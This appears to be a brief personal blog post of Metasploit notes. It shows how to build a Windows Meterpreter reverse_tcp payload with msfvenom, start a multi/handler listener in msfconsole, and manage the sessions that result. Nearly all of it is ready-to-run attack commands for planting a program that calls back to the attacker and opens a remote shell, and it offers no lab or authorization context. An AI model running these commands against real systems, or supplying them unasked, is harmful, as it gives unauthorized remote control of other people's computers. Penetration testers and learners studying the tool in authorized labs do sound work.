---
layout: post
title: "Meterpreter"
date:   2020-05-23 10:00:00
---

# Set up reverse TCP shell

To set up the reverse shell: 
 * You need to create your program which will be executed on the target
 * You need to launch a listener, awaiting for the connection (from your program)

To generate your program
{% highlight bash %}
msfvenom -p windows/meterpreter/reverse_tcp lhost=[your IP] -f exe|msi|... -o name.exe|msi|...
{% endhighlight %}

You need to specify your IP and not the target IP since your program will try to connect with your machine.

To launch the listener
{% highlight bash %}
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost [your IP]
set lport [default 4444] | unset lport
run
{% endhighlight %}


Once the program is executed, you will see a session meterpreter.
You can have multiple sessions:
{% highlight bash %}
 sessions -i ID_meterpreter_session (on msfconsole, not meterpreter session)
 sessions -h
{% endhighlight %}

